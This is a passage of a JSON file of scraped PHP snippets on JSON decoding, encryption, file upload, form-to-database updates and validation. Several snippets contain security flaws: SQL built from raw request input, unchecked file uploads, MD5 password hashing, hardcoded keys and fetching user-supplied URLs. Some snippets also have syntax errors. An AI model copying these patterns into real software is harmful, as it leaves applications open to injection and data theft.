    "description": "$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n// Checks if json function isJson($string) {    json_decode($string);    return json_last_error() === JSON_ERROR_NONE; }  // example if (isJson($string) {   // Do your stuff here }\n<?php  $json = '{\"firstName\":\"Peter\",\"lastName:\":\"Silva\",\"age\":23}';  $personInfo = json_decode(json);  echo $personInfo->age;  ?>\n$obj = json_decode(\"{string:'string'}\");\n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4328,
    "keyword": null,
    "link": null,
    "title": " php turney if",
    "description": "<?php $marks=40; print ($marks>=40) ? \"pass\" : \"Fail\"; ?> \n(Condition) ? (Statement1) : (Statement2); \n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4329,
    "keyword": null,
    "link": null,
    "title": " php two way encrypt decrypt",
    "description": "function encrypt_decrypt($string, $action = 'encrypt') {     $encrypt_method = \"AES-256-CBC\";     $secret_key = 'AA74CDCC2BBRT935136HH7B63C27'; // user define private key     $secret_iv = '5fgf5HJ5g27'; // user define secret key     $key = hash('sha256', $secret_key);     $iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is hash_hmac_algo     if ($action == 'encrypt') {         $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);         $output = base64_encode($output);     } else if ($action == 'decrypt') {         $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);     }     return $output; }   echo \"Your Encrypted password is = \". $pwd = encrypt_decrypt('spaceo', 'encrypt'); echo \"Your Decrypted password is = \". encrypt_decrypt($pwd, 'decrypt'); \n$decoded = base64_decode($encoded); \nfunction encryptor($action, $string) { \t$output = FALSE; \t$encrypt_method = \"AES-256-CBC\"; \t$secret_key = 'SecretKeyWord'; \t$secret_iv  = 'SecretIV@123GKrQp'; \t// hash \t$key = hash('sha256', $secret_key); \t// iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning \t$iv = substr(hash('sha256', $secret_iv), 0, 16); \t//do the encryption given text/string/number \tif ($action == 'encrypt') { \t\t$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv); \t\t$output = base64_encode($output); \t} elseif ($action == 'decrypt') { \t\t//decrypt the given text/string/number \t\t$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv); \t} \treturn $output; }  function encrypt($data) { \treturn urlencode(self::encryptor('encrypt', self::sanitize($data))); }  function decrypt($data) { \treturn self::encryptor('decrypt', urldecode(self::sanitize($data))); } // Now you can just call encrypt($string) or decrypt($string) ?>\n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4330,
    "keyword": null,
    "link": null,
    "title": " php typeof",
    "description": "gettype($var);\ngettype($object);\ngettype($u)\ngettype ( mixed $var ) : string  gettype (\"SALUT\") => string gettype (2) => integer       ...etc ...    \"bool\" \"integer\" \"double\" \"array\" \"object\" \"resource\" \"NULL\" \"unknown type\"\ngettype ( mixed $var ) : string \ngettype($var)\n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4331,
    "keyword": null,
    "link": null,
    "title": " php ucfirst all words",
    "description": "$foo = 'hello world!'; $foo = ucwords($foo);             // Hello World!  $bar = 'HELLO WORLD!'; $bar = ucwords($bar);             // HELLO WORLD! $bar = ucwords(strtolower($bar)); // Hello World!  //With custom delimiter $foo = 'hello|world!'; $bar = ucwords($foo);             // Hello|world!  $baz = ucwords($foo, \"|\"); \n <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?> // string manipulation function  \n$upperCaseSentance=ucwords(\"i do not feel good\");//I Do Not Feel Good\n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4332,
    "keyword": null,
    "link": null,
    "title": " php ufnctions",
    "description": "<?php function writeMsg() {     echo \"Hello world!\"; }  writeMsg(); //call the function ?>\n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4333,
    "keyword": null,
    "link": null,
    "title": " php undefined index",
    "description": "// Your array index has no value or is not referencing anything, // The easiest way to overcome this is to simply check whether // it has been defined if (isset($arr[$i])) { \t// Do something }\n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4334,
    "keyword": null,
    "link": null,
    "title": " php unique id",
    "description": "uniqid ([ string $prefix = \"\" [, bool $more_entropy = FALSE ]] ) : string\nfunction gen_uid($l=10){     return substr(str_shuffle(\"0123456789abcdefghijklmnopqrstuvwxyz\"), 0, $l); } \n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4335,
    "keyword": null,
    "link": null,
    "title": " php unique random number",
    "description": "you can use rand() function for that in php. Example: Generate random numbers between 1 to 50 <?php   echo rand(1,50); ?>\n$uniqueCode = md5(uniqid(rand(), true)); echo $uniqueCode;\n<?php      $random = substr(md5(mt_rand()), 0, 7);     echo $random; ?>\n<?php $n=range(11,20); shuffle($n); for ($x=0; $x< 10; $x++) { echo $n[$x].' '; } echo \"\\n\" ?>  \n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4336,
    "keyword": null,
    "link": null,
    "title": " php unit",
    "description": "composer require --dev phpunit/phpunit ^9.3 \n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4337,
    "keyword": null,
    "link": null,
    "title": " php unix timestamp to date",
    "description": "<?php  echo date('m/d/Y H:i:s', 1541843467);  ?> \n<?php $timestamp=1333699439; echo gmdate(\"Y-m-d\\TH:i:s\\Z\", $timestamp); ?>\n$date = new DateTime(); echo $date->getTimestamp();\n$currentTime = DateTime::createFromFormat( 'U', $timestamp ); \n <?php $date = new DateTime(); echo $date->format('U = Y-m-d H:i:s') . \"\\n\";  $date->setTimestamp(1171502725); echo $date->format('U = Y-m-d H:i:s') . \"\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:19:35.000Z"
  },
  {
    "id": 4338,
    "keyword": null,
    "link": null,
    "title": " php unlink",
    "description": "/* Deleting files is a concept in file handeling of PHP We can remove or delete the file from real folder path using below code */  unlink($Your_file_path);   // direct deleting the file  /* Delete file if its exist in folder */  if (file_exists($Your_file_path)) {   unlink($Your_file_path); }   /* I hope it will help you. Namaste */\n<?php    unlink('test.html'); ?>\n<?php // use unlink('filename.extension') to delete a file // For example:  unlink('foo.php'); // will remove the file named foo.php       // Happy coding, my homies! <3 ?>\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4339,
    "keyword": null,
    "link": null,
    "title": " php unset array element",
    "description": "$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4340,
    "keyword": null,
    "link": null,
    "title": " php unset array key",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\nunset($dataArray['key']); \n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]); //Key which you want to delete /* $array: [     [0] => a     [2] => c ] */ //OR $array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; array_splice($array, 1, 1);//Offset which you want to delet /* $array: [     [0] => a     [1] => c ] */\nunset($array['key-here']);\n$result_Member = $this->Member->get_list_member_belong_to_company($id);  /*  $result_Member = array( \t[10] => 10,     [20] => 11,     [30] => 12, ) */  // remove key, get values only $member_ids = array_values($result_Member);  /* $result_Member = array( \t[0] => 10,     [1] => 11,     [2] => 12, ) */\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4341,
    "keyword": null,
    "link": null,
    "title": " php unset reference",
    "description": "$ref = &$var;  unset($ref);\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4342,
    "keyword": null,
    "link": null,
    "title": " php unset session variable",
    "description": "// Destroy a sesion variable name 'variable_name'  <?php unset($_SESSION['variable_name']); ?>\nsession_unset();    //Destrol all session variables\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4343,
    "keyword": null,
    "link": null,
    "title": " php update multiple columns",
    "description": "$sql = \"UPDATE product_list SET product_name='\".$product_name.\"',product_category='\".$product_category.\"',product_price='\".$product_price.\"',product_description='\".$product_description.\"',size_category='\".$size_category.\"'\";\n\"UPDATE product_list  set  product_name='$product_name',  product_category ='$product_category',  product_price='$product_price', product_description='$product_description', product_size_category='$size_category' where product_id='$product_id' \"\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4344,
    "keyword": null,
    "link": null,
    "title": " php update sql database from form",
    "description": "<?php  include \"config.php\"; // Using database connection file here  $id = $_GET['id']; // get id through query string  $qry = mysqli_query($db,\"select * from emp where id='$id'\"); // select query  $data = mysqli_fetch_array($qry); // fetch data  if(isset($_POST['update'])) // when click on Update button {     $fname = $_POST['fname'];     $lname = $_POST['lname']; \t     $edit = mysqli_query($db,\"update emp set fname='$fname', lname='$lname' where id='$id'\"); \t     if($edit)     {         mysqli_close($db); // Close connection         header(\"location:all_records.php\"); // redirects to all records page         exit;     }     else     {         echo mysqli_error();     }    \t } ?>  <h3>Update Data</h3>  <form method=\"POST\">   <input type=\"text\" name=\"fname\" value=\"<?php echo $data['fname'] ?>\" placeholder=\"Enter Full Name\" Required>   <input type=\"text\" name=\"lname\" value=\"<?php echo $data['lname'] ?>\" placeholder=\"Enter Last Name\" Required>   <input type=\"submit\" name=\"update\" value=\"Update\"> </form>\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4345,
    "keyword": null,
    "link": null,
    "title": " php upload file",
    "description": "<?php    if(isset($_FILES['image'])){       $errors= array();       $file_name = $_FILES['image']['name'];       $file_size =$_FILES['image']['size'];       $file_tmp =$_FILES['image']['tmp_name'];       $file_type=$_FILES['image']['type'];       $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));              $extensions= array(\"jpeg\",\"jpg\",\"png\");              if(in_array($file_ext,$extensions)=== false){          $errors[]=\"extension not allowed, please choose a JPEG or PNG file.\";       }              if($file_size > 2097152){          $errors[]='File size must be excately 2 MB';       }              if(empty($errors)==true){          move_uploaded_file($file_tmp,\"images/\".$file_name);          echo \"Success\";       }else{          print_r($errors);       }    } ?>\n//This is the minimal code for an image upload for first time learners //html portion <!DOCTYPE html> <html> <head> \t<title>ImageUpload</title> </head> <body> \t<form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\"> \t\t<label>Username</label> \t\t<input type=\"text\" name=\"username\"> \t\t<br> \t\t<label>UploadImage</label> \t\t<input type=\"file\" name='myfile'> \t\t<br/> \t\t<input type=\"submit\" value=\"upload\"> \t</form> </body> </html>     //php portion   <?php \t$user=$_POST['username']; \t$image=$_FILES['myfile']; \techo \"Hello $user <br/>\"; \techo \"File Name<b>::</b> \".$image['name'];  \tmove_uploaded_file($image['tmp_name'],\"photos/\".$image['name']); \t//here the \"photos\" folder is in same folder as the upload.php,  \t//otherwise complete url has to be mentioned \t?>\n <?php if(isset($_POST['btn-upload'])) {            $file = rand(1000,100000).\"-\".$_FILES['file']['name'];     $file_loc = $_FILES['file']['tmp_name'];  $file_size = $_FILES['file']['size'];  $file_type = $_FILES['file']['type'];  $folder=\"uploads/\";    move_uploaded_file($file_loc,$folder.$file);  $sql=\"INSERT INTO tbl_uploads(file,type,size) VALUES('$file','$file_type','$file_size')\";  mysql_query($sql);  } ?>\n<?php    if(isset($_FILES['image'])){       $errors= array();       $file_name = $_FILES['image']['name'];       $file_size =$_FILES['image']['size'];       $file_tmp =$_FILES['image']['tmp_name'];       $file_type=$_FILES['image']['type'];       $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));              $extensions= array(\"jpeg\",\"jpg\",\"png\");              if(in_array($file_ext,$extensions)=== false){          $errors[]=\"extension not allowed, please choose a JPEG or PNG file.\";       }              if($file_size > 2097152){          $errors[]='File size must be excately 2 MB';       }              if(empty($errors)==true){          move_uploaded_file($file_tmp,\"images/\".$file_name);          echo \"Success\";       }else{          print_r($errors);       }    } ?> <html>    <body>              <form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">          <input type=\"file\" name=\"image\" />          <input type=\"submit\"/>       </form>           </body> </html>\n// To change: FILENAME, array with allowed extensions, Max Filesite, Filepath if(upload(\"FILENAME\", array(\"jpeg\",\"jpg\",\"png\"), 209715, \"C:/xampp/htdocs/\")){         echo \"Success\";     }   function upload($f_name, $f_ext_allowed, $f_maxsize, $f_path){        $f_name_2 = $_FILES[$f_name]['name'];       $f_size  =  $_FILES[$f_name]['size'];       $f_tmp   =  $_FILES[$f_name]['tmp_name'];       $f_error =  $_FILES[$f_name]['error'];       $f_ext   = strtolower(end(explode('.',$f_name_2)));       $f_rename = $_SESSION['uid'] . \".\" . $f_ext;          if($f_error == 0 && in_array($f_ext, $f_ext_allowed)          && $f_size < $f_maxsize && mb_strlen($f_name_2, \"UTF-8\") < 225          && preg_match(\"`^[-0-9A-Z_\\.]+$`i\", $f_name_2)){             if(move_uploaded_file($f_tmp, $f_path . $f_name_2){                 return true;             }else{                 return false;             }         }else{             return false;         } }\n<?php /* echo \"<pre>\"; echo \"FILES:<br>\"; print_r ($_FILES ); echo \"</pre>\"; */ if ( $_FILES['uploaddatei']['name']  <> \"\" ) {     // Datei wurde durch HTML-Formular hochgeladen     // und kann nun weiterverarbeitet werden      // Kontrolle, ob Dateityp zul&auml;ssig ist     $zugelassenedateitypen = array(\"image/png\", \"image/jpeg\", \"image/gif\");      if ( ! in_array( $_FILES['uploaddatei']['type'] , $zugelassenedateitypen ))     {         echo \"<p>Dateitype ist NICHT zugelassen</p>\";     }     else     {         // Test ob Dateiname in Ordnung         $_FILES['uploaddatei']['name']                                 = dateiname_bereinigen($_FILES['uploaddatei']['name']);          if ( $_FILES['uploaddatei']['name'] <> '' )         {             move_uploaded_file (                  $_FILES['uploaddatei']['tmp_name'] ,                  'hochgeladenes/'. $_FILES['uploaddatei']['name'] );              echo \"<p>Hochladen war erfolgreich: \";             echo '<a href=\"hochgeladenes/'. $_FILES['uploaddatei']['name'] .'\">';             echo 'hochgeladenes/'. $_FILES['uploaddatei']['name'];             echo '</a>';         }         else         {             echo \"<p>Dateiname ist nicht zul&auml;ssig</p>\";         }     } }  function dateiname_bereinigen($dateiname) {     // erw&uuml;nschte Zeichen erhalten bzw. umschreiben     // aus allen &auml; wird ae, &uuml; -> ue, &szlig; -> ss (je nach Sprache mehr Aufwand)     // und sonst noch ein paar Dinge (ist sch&auml;tzungsweise mein pers&ouml;nlicher Geschmach ;)     $dateiname = strtolower ( $dateiname );     $dateiname = str_replace ('\"', \"-\", $dateiname );     $dateiname = str_replace (\"'\", \"-\", $dateiname );     $dateiname = str_replace (\"*\", \"-\", $dateiname );     $dateiname = str_replace (\"&szlig;\", \"ss\", $dateiname );     $dateiname = str_replace (\"&szlig;\", \"ss\", $dateiname );     $dateiname = str_replace (\"&auml;\", \"ae\", $dateiname );     $dateiname = str_replace (\"&auml;\", \"ae\", $dateiname );     $dateiname = str_replace (\"&ouml;\", \"oe\", $dateiname );     $dateiname = str_replace (\"&ouml;\", \"oe\", $dateiname );     $dateiname = str_replace (\"&uuml;\", \"ue\", $dateiname );     $dateiname = str_replace (\"&uuml;\", \"ue\", $dateiname );     $dateiname = str_replace (\"&Auml;\", \"ae\", $dateiname );     $dateiname = str_replace (\"&Ouml;\", \"oe\", $dateiname );     $dateiname = str_replace (\"&Uuml;\", \"ue\", $dateiname );     $dateiname = htmlentities ( $dateiname );     $dateiname = str_replace (\"&\", \"und\", $dateiname );     $dateiname = str_replace (\" \", \"und\", $dateiname );     $dateiname = str_replace (\"(\", \"-\", $dateiname );     $dateiname = str_replace (\")\", \"-\", $dateiname );     $dateiname = str_replace (\" \", \"-\", $dateiname );     $dateiname = str_replace (\"'\", \"-\", $dateiname );     $dateiname = str_replace (\"/\", \"-\", $dateiname );     $dateiname = str_replace (\"?\", \"-\", $dateiname );     $dateiname = str_replace (\"!\", \"-\", $dateiname );     $dateiname = str_replace (\":\", \"-\", $dateiname );     $dateiname = str_replace (\";\", \"-\", $dateiname );     $dateiname = str_replace (\",\", \"-\", $dateiname );     $dateiname = str_replace (\"--\", \"-\", $dateiname );      // und nun jagen wir noch die Heilfunktion dar&uuml;ber     $dateiname = filter_var($dateiname, FILTER_SANITIZE_URL);     return ($dateiname); } ?>  <form name=\"uploadformular\"        enctype=\"multipart/form-data\" action=\"dateiupload.php\" method=\"post\"> Datei: <input type=\"file\" name=\"uploaddatei\" size=\"60\" maxlength=\"255\"> <input type=\"Submit\" name=\"submit\" value=\"Datei hochladen\"> </form>\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4346,
    "keyword": null,
    "link": null,
    "title": " php upload file via curl",
    "description": "if (function_exists('curl_file_create')) { // php 5.5+   $cFile = curl_file_create($file_name_with_full_path); } else { //    $cFile = '@' . realpath($file_name_with_full_path); } $post = array('extra_info' => '123456','file_contents'=> $cFile); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,$target_url); curl_setopt($ch, CURLOPT_POST,1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post); $result=curl_exec ($ch); curl_close ($ch);\n",
    "reg_date": "2021-10-12T10:19:36.000Z"
  },
  {
    "id": 4347,
    "keyword": null,
    "link": null,
    "title": " php upload from url",
    "description": "<?php if(isset($_POST['get_image'])) {  $url=$_POST['img_url'];  $data = file_get_contents($url);  $new = 'images/new_image.jpg';  file_put_contents($new, $data);  echo \"<img src='images/new_image.jpg'>\"; } ?>\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4348,
    "keyword": null,
    "link": null,
    "title": " php upload multiple files",
    "description": "<!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>TEST</title> </head> <body>     <form autocomplete=\"off\" method=\"post\" action=\"\" enctype=\"multipart/form-data\">         <input id=\"file\" name=\"file[]\" type=\"file\" multiple=\"multiple\">         <button name=\"submit\" type=\"submit\">Senden</button>     </form> </body> </html> <?php      if(isset($_POST['submit'])){          for($i = 0; $i < count($_FILES['file']['name']);$i++){           $f_maxsize = 41943040;           $f_ext_allowed = array(\"stl\", \"STL\", \"jpeg\", \"png\", \"gif\");            $f_name_2 = str_replace(\" \",\"_\", htmlspecialchars($_FILES[\"file\"]['name'][$i]));           $f_size  =  $_FILES[\"file\"]['size'][$i];           $f_tmp   =  $_FILES[\"file\"]['tmp_name'][$i];           $f_error =  $_FILES[\"file\"]['error'][$i];           $f_ext = pathinfo($f_name_2, PATHINFO_EXTENSION);            # Check the file for errors etc...            move_uploaded_file($f_tmp, \"to/upload/directory/\" . $_FILES[\"file\"]['name'][$i]);          }     } ?>\narray_map( function ($a) { return include($a); }, array('xx.php','yy.php','zz.php'));\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4349,
    "keyword": null,
    "link": null,
    "title": " php uppercase",
    "description": "//string to all uppercase $string = \"String with Mixed use of Uppercase and Lowercase\"; //php string to uppercase $string = strtoupper($string); // = \"STRING WITH MIXED USE OF UPPERCASE AND LOWERCASE\"\n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase; // THIS IS LOWER CASE\n<?php /* There is a function in php wich convert all string to uppercase */    echo strtoupper(\"Hello samy! how are u ?\");   // output :   HELLO SAMY! HOW ARE U ? ?>\nucwords(\"hello world\"); // Hello World ucfirst(\"hello world\"); // Hello world\n <?php $str = \"Mary Had A Little Lamb and She LOVED It So\"; $str = strtoupper($str); echo $str; // muestra: MARY HAD A LITTLE LAMB AND SHE LOVED IT SO ?>  \n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase;\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4350,
    "keyword": null,
    "link": null,
    "title": " php uppercase each word",
    "description": "$upperCaseSentance=ucwords(\"i do not feel good\");//I Do Not Feel Good\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4351,
    "keyword": null,
    "link": null,
    "title": " php uppercase first letter",
    "description": " <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?>  \n <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?> // string manipulation function  \nucwords(\"hello world\"); // Hello World ucfirst(\"hello world\"); // Hello world\n<?php /* Convert the first character of \"hello\" to uppercase:  */ echo ucfirst(\"hello samy!\");  //output : Hello samy! ?>\n$clientname = \"ankur prajapati\"; ucwords($clientname);//Ankur Prajapati ucfirst($clientname);//Ankur Prajapati  $clientname = \"ANKUR PRAJAPATI\"; ucfirst(strtolower($clientname));//Ankur Prajapati\nucfirst($myword);\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4352,
    "keyword": null,
    "link": null,
    "title": " php url parse",
    "description": " <?php $url = 'http://username:password@hostname:9090/path?arg=value#anchor';  var_dump(parse_url($url)); var_dump(parse_url($url, PHP_URL_SCHEME)); var_dump(parse_url($url, PHP_URL_USER)); var_dump(parse_url($url, PHP_URL_PASS)); var_dump(parse_url($url, PHP_URL_HOST)); var_dump(parse_url($url, PHP_URL_PORT)); var_dump(parse_url($url, PHP_URL_PATH)); var_dump(parse_url($url, PHP_URL_QUERY)); var_dump(parse_url($url, PHP_URL_FRAGMENT));  \n    //https://www.google.com/search?key=1234 \t$url = $_SERVER['REQUEST_URI'];      $url_components = parse_url($url);      parse_str($url_components['query'], $params);      $key = $params['key'];   // key=1234\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4353,
    "keyword": null,
    "link": null,
    "title": " php urlencodedtext",
    "description": " urlencode(\"query string params\");\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4354,
    "keyword": null,
    "link": null,
    "title": " php user login and registration",
    "description": "<?php session_start();  // initializing variables $username = \"\"; $email    = \"\"; $errors = array();   // connect to the database $db = mysqli_connect('localhost', 'root', '', 'registration');  // REGISTER USER if (isset($_POST['reg_user'])) {   // receive all input values from the form   $username = mysqli_real_escape_string($db, $_POST['username']);   $email = mysqli_real_escape_string($db, $_POST['email']);   $password_1 = mysqli_real_escape_string($db, $_POST['password_1']);   $password_2 = mysqli_real_escape_string($db, $_POST['password_2']);    // form validation: ensure that the form is correctly filled ...   // by adding (array_push()) corresponding error unto $errors array   if (empty($username)) { array_push($errors, \"Username is required\"); }   if (empty($email)) { array_push($errors, \"Email is required\"); }   if (empty($password_1)) { array_push($errors, \"Password is required\"); }   if ($password_1 != $password_2) { \tarray_push($errors, \"The two passwords do not match\");   }    // first check the database to make sure    // a user does not already exist with the same username and/or email   $user_check_query = \"SELECT * FROM users WHERE username='$username' OR email='$email' LIMIT 1\";   $result = mysqli_query($db, $user_check_query);   $user = mysqli_fetch_assoc($result);      if ($user) { // if user exists     if ($user['username'] === $username) {       array_push($errors, \"Username already exists\");     }      if ($user['email'] === $email) {       array_push($errors, \"email already exists\");     }   }    // Finally, register user if there are no errors in the form   if (count($errors) == 0) {   \t$password = md5($password_1);//encrypt the password before saving in the database    \t$query = \"INSERT INTO users (username, email, password)    \t\t\t  VALUES('$username', '$email', '$password')\";   \tmysqli_query($db, $query);   \t$_SESSION['username'] = $username;   \t$_SESSION['success'] = \"You are now logged in\";   \theader('location: index.php');   } }  // ...  \n<html> <head> <title>PHP User Registration Form</title> <link href=\"./css/style.css\" rel=\"stylesheet\" type=\"text/css\" /> </head> <body>     <form name=\"frmRegistration\" method=\"post\" action=\"\">         <div class=\"demo-table\">         <div class=\"form-head\">Sign Up</div>              <?php if (! empty($errorMessage) && is_array($errorMessage)) {     ?>\t             <div class=\"error-message\">             <?php              foreach($errorMessage as $message) {                 echo $message . \"<br/>\";             }             ?>             </div> <?php } ?>             <div class=\"field-column\">                 <label>Username</label>                 <div>                     <input type=\"text\" class=\"demo-input-box\"                         name=\"userName\"                         value=\"<?php if(isset($_POST['userName'])) echo $_POST['userName']; ?>\">                 </div>             </div>                          <div class=\"field-column\">                 <label>Password</label>                 <div><input type=\"password\" class=\"demo-input-box\"                     name=\"password\" value=\"\"></div>             </div>             <div class=\"field-column\">                 <label>Confirm Password</label>                 <div>                     <input type=\"password\" class=\"demo-input-box\"                         name=\"confirm_password\" value=\"\">                 </div>             </div>             <div class=\"field-column\">                 <label>Display Name</label>                 <div>                     <input type=\"text\" class=\"demo-input-box\"                         name=\"firstName\"                         value=\"<?php if(isset($_POST['firstName'])) echo $_POST['firstName']; ?>\">                 </div>              </div>             <div class=\"field-column\">                 <label>Email</label>                 <div>                     <input type=\"text\" class=\"demo-input-box\"                         name=\"userEmail\"                         value=\"<?php if(isset($_POST['userEmail'])) echo $_POST['userEmail']; ?>\">                 </div>             </div>             <div class=\"field-column\">                 <div class=\"terms\">                     <input type=\"checkbox\" name=\"terms\"> I accept terms                     and conditions                 </div>                 <div>                     <input type=\"submit\"                         name=\"register-user\" value=\"Register\"                         class=\"btnRegister\">                 </div>             </div>         </div>     </form> </body> </html>\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4355,
    "keyword": null,
    "link": null,
    "title": " php usort keep keys",
    "description": "// Use \"uasort\" instead of \"usort\" function order_asc($a, $b) {   return $b[\"popularity\"] - $a[\"popularity\"]; } uasort(array, \"order_asc\");\n",
    "reg_date": "2021-10-12T10:19:37.000Z"
  },
  {
    "id": 4356,
    "keyword": null,
    "link": null,
    "title": " php utf-8",
    "description": "header('Content-Type: text/html; charset=utf-8');\nutf8_encode ( string $data )\n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4357,
    "keyword": null,
    "link": null,
    "title": " php utf8 decode",
    "description": "$a = \"N&atilde;o\";    echo utf8_encode($a);   \n// utf8_decode() function is an inbuilt function in PHP which is used // to decode a UTF-8 string to the ISO-8859-1  $string_to_decode = \"K&Atilde;&cedil;benhavns\"; utf8_decode($string_to_decode); // returns K&oslash;benhavns\n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4358,
    "keyword": null,
    "link": null,
    "title": " php uuid generator",
    "description": "uniqid() uniqid('php_')\nuniqid ([ string $prefix = \"\" [, bool $more_entropy = FALSE ]] ) : string\n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4359,
    "keyword": null,
    "link": null,
    "title": " php validate date format",
    "description": "$date=\"2012-09-12\";  if (preg_match(\"/^(20[0-9]{2})-(0[1-9]|1[0-2])-(0[1-9]|[1-2][0-9]|3[0-1])$/\",$date)) {     return true; } else {     return false; } \nfunction isValidDate(string $date, string $format = 'Y-m-d'): bool {     $dateObj = DateTime::createFromFormat($format, $date);     return $dateObj && $dateObj->format($format) == $date; } \n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4360,
    "keyword": null,
    "link": null,
    "title": " php validate date format yyyy-mm-dd",
    "description": "$date=\"2012-09-12\";  if (preg_match(\"/^[0-9]{4}-(0[1-9]|1[0-2])-(0[1-9]|[1-2][0-9]|3[0-1])$/\",$date)) {     return true; } else {     return false; }\n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4361,
    "keyword": null,
    "link": null,
    "title": " php validate image",
    "description": "$image_name = $_FILES[\"inputname\"][\"name\"]; $allowed_extensions = array(\"png\", \"jpg\", \"jpeg\"); $image_extension = explode(\".\", $image_name); /*   *Explode returns array of words   *Explode Example:   \texplode(search_for, where to search for);     let imagine that the image named => myimage.png     expldoe funtion will search the word for '.' and explode it     from the example, explode will return array(\"myimage\", \"png\")     Now we find our image extension, but it is in the array.     we use end() function that will return the last index in the array as a string */ $extension = end($image_extension); // which is png if(!in_array($extension, $allowed_extensions)){   echo \"Please upload an image\"; } else{   echo \"Allowed Image\"; } \nIf you want to be absolutely sure, and your PHP is enabled for remote  connections, you can just use \"getimagesize('url')\"  function validImage($url) {    return stripos(getimagesize($url)['mime'], 'image') === 0; }  $image = validImage('http://www.example.com/image.jpg');  If it returns an array, it is an image type recognized by PHP, even if the  image extension is not in the url (per your second link). You have to keep in mind that this method will make a remote connection for each request, so  perhaps cache urls that you already probed in a database to lower connections.\n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4362,
    "keyword": null,
    "link": null,
    "title": " php validate name",
    "description": " if(preg_match(\"/^([a-zA-Z' ]+)$/\",$name)){    retun true; // is validate name   } \n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4363,
    "keyword": null,
    "link": null,
    "title": " php validate only numbers",
    "description": "is_numeric($value); //returns true || false\n/^$|^[0-9]{12}$/ \n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4364,
    "keyword": null,
    "link": null,
    "title": " php validate phone number",
